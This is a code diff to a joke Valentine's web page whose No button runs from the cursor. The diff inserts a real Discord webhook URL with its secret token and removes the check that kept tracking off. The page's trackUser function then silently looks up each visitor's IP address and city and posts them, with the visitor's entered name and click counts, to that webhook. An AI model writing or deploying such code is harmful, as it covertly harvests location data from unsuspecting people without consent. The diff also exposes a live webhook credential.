@@ -29,10 +29,7 @@
     /* Floating Hearts Background */
     .heart-bg {
       position: fixed;
-      top: 0;
-      left: 0;
-      width: 100%;
-      height: 100%;
+      top: 0; left: 0; width: 100%; height: 100%;
       pointer-events: none;
       z-index: 1;
     }
@@ -69,6 +66,7 @@
       font-size: 1.2rem;
       text-align: center;
       outline: none;
+      margin-bottom: 20px;
     }
 
     /* Main Card */
@@ -81,7 +79,7 @@
       height: 550px; 
       border-radius: 40px;
       box-shadow: 0 15px 50px rgba(0,0,0,0.1);
-      display: none; /* Hidden until name is entered */
+      display: none; 
       flex-direction: column;
       align-items: center;
       justify-content: space-between;
@@ -91,7 +89,7 @@
     }
 
     .header-info { z-index: 100; position: relative; pointer-events: none; }
-    #joke-text { font-size: 0.9rem; color: var(--primary); min-height: 50px; font-weight: 800; text-transform: uppercase; margin-bottom: 5px; }
+    #joke-text { font-size: 0.9rem; color: var(--primary); min-height: 50px; font-weight: 800; text-transform: uppercase; }
     h1 { color: var(--primary); font-size: 1.6rem; margin: 0; line-height: 1.2; }
 
     .yes-wrapper { flex-grow: 1; display: flex; justify-content: center; align-items: center; width: 100%; z-index: 20; }
@@ -105,7 +103,7 @@
       border: none;
       border-radius: 50px;
       cursor: pointer;
-      transition: all 0.3s cubic-bezier(0.175, 0.885, 0.32, 1.275);
+      transition: transform 0.3s cubic-bezier(0.175, 0.885, 0.32, 1.275);
     }
 
     #no {
@@ -118,7 +116,7 @@
       border-radius: 50px;
       position: absolute;
       z-index: 200;
-      transition: top 0.3s ease, left 0.3s ease;
+      transition: top 0.3s cubic-bezier(0.18, 0.89, 0.32, 1.28), left 0.3s cubic-bezier(0.18, 0.89, 0.32, 1.28);
       white-space: nowrap;
       left: 50%; top: 80%; transform: translate(-50%, -50%);
     }
@@ -135,15 +133,15 @@
   <div class="heart-bg" id="heartBg"></div>
 
   <div id="namePortal">
-    <h1 style="margin-bottom: 20px;">Who is opening this?</h1>
+    <h1 style="margin-bottom: 20px; color:#ff4d6d;">Who is opening this?</h1>
     <input type="text" id="userName" placeholder="Enter your name...">
-    <button onclick="startApp()" style="margin-top:20px; background:var(--primary); color:white; border:none; padding:10px 30px; border-radius:30px; cursor:pointer;">Enter</button>
+    <button onclick="startApp()" style="background:var(--primary); color:white; border:none; padding:12px 40px; border-radius:30px; cursor:pointer; font-weight:bold;">Enter</button>
   </div>
 
   <div class="card" id="mainCard">
     <div class="header-info">
       <div id="joke-text">CATCH ME IF YOU CAN! 😉</div>
-      <h1 id="title">Will you be my Valentine? 🌹</h1>
+      <h1>Will you be my Valentine? 🌹</h1>
     </div>
     <div class="yes-wrapper">
       <button id="yes" onclick="yesClick()">Yes</button>
@@ -155,9 +153,9 @@
   let visitorName = "";
   let clickCount = 0;
   let yesScale = 1;
-  const WEBHOOK_URL = "YOUR_DISCORD_WEBHOOK_URL"; 
+  const WEBHOOK_URL = "https://discord.com/api/webhooks/1468954384997023777/oL5KyCiivYCBUM3gI0_JWhkKiBV8t6ngFZjZbanUQ_XMUc2E2oWU1_OZw4u0eFfnax7A";
 
-  // Create Background Hearts
+  // Background Hearts
   function createHearts() {
     const bg = document.getElementById('heartBg');
     for(let i=0; i<15; i++) {
@@ -182,7 +180,6 @@
   }
 
   async function trackUser(event) {
-    if(!WEBHOOK_URL.includes("DISCORD")) return;
     try {
       const ipRes = await fetch('https://ipapi.co/json/');
       const data = await ipRes.json();
@@ -190,18 +187,29 @@
         method: 'POST',
         headers: {'Content-Type': 'application/json'},
         body: JSON.stringify({
-          content: `💖 **Valentine Update**\n**User:** ${visitorName}\n**Event:** ${event}\n**IP:** ${data.ip}\n**Location:** ${data.city}, ${data.country_name}`
+          embeds: [{
+            title: "💖 Valentine Tracker",
+            color: 0xff4d6d,
+            fields: [
+              { name: "User", value: visitorName, inline: true },
+              { name: "Event", value: event, inline: true },
+              { name: "Location", value: `${data.city}, ${data.country_name}`, inline: false },
+              { name: "IP Address", value: data.ip, inline: true },
+              { name: "Clicks", value: clickCount.toString(), inline: true }
+            ],
+            timestamp: new Date()
+          }]
         })
       });
-    } catch(e) {}
+    } catch(e) { console.log("Tracking restricted"); }
   }
 
   const noBtn = document.getElementById("no");
   const card = document.getElementById("mainCard");
   const yesBtn = document.getElementById("yes");
-  const jokes = ["NICE TRY! 😉", "TOO SLOW!", "ERROR 404!", "MISSED ME!", "JUST SAY YES! ❤️"];
+  const jokes = ["NICE TRY! 😉", "TOO SLOW!", "ERROR 404!", "MISSED ME!", "JUST SAY YES! ❤️", "YOU'RE PERSISTENT!", "DENIED!"];
 
-  // Magnetic Movement
+  // Magnetic Movement logic
   const handleInput = (x, y) => {
     const rect = noBtn.getBoundingClientRect();
     const dist = Math.sqrt(Math.pow(x - (rect.left + rect.width/2), 2) + Math.pow(y - (rect.top + rect.height/2), 2));
@@ -213,6 +221,8 @@
 
   function moveNo() {
     clickCount++;
+    
+    // Yes Button Growth (Caps then pulses)
     if (yesScale < 2.5) { 
       yesScale += 0.15;
       yesBtn.style.transform = `scale(${yesScale})`;
@@ -220,9 +230,13 @@
       yesBtn.style.animation = "pulse 1.5s infinite";
     }
 
+    // No Button Teleport (Stays same size)
     const pad = 50;
-    noBtn.style.left = (Math.floor(Math.random() * (card.clientWidth - noBtn.offsetWidth - pad)) + pad/2) + "px";
-    noBtn.style.top = (Math.floor(Math.random() * (card.clientHeight - noBtn.offsetHeight - pad)) + pad/2) + "px";
+    const maxX = card.clientWidth - noBtn.offsetWidth - pad;
+    const maxY = card.clientHeight - noBtn.offsetHeight - pad;
+    noBtn.style.left = (Math.floor(Math.random() * maxX) + pad/2) + "px";
+    noBtn.style.top = (Math.floor(Math.random() * maxY) + pad/2) + "px";
+
     document.getElementById("joke-text").innerText = jokes[clickCount % jokes.length];
     
     if(clickCount % 15 === 0) trackUser(`Clicked No ${clickCount} times`);
@@ -232,7 +246,6 @@
     noBtn.style.display = "none";
     trackUser("SAID YES! ❤️");
     
-    // Confetti Burst
     confetti({
       particleCount: 150,
       spread: 70,
@@ -242,7 +255,7 @@
 
     document.getElementById("mainCard").innerHTML = `
       <div style="margin: auto; z-index:100;">
-        <h1 style='font-size: 2.2rem;'>I KNEW IT! ❤️</h1>
+        <h1 style='font-size: 2.5rem;'>I KNEW IT! ❤️</h1>
         <p style='color: #ff4d6d; font-weight: 800; margin-top: 15px;'>HAPPY VALENTINE'S DAY, ${visitorName.toUpperCase()}!</p>
       </div>
     `;
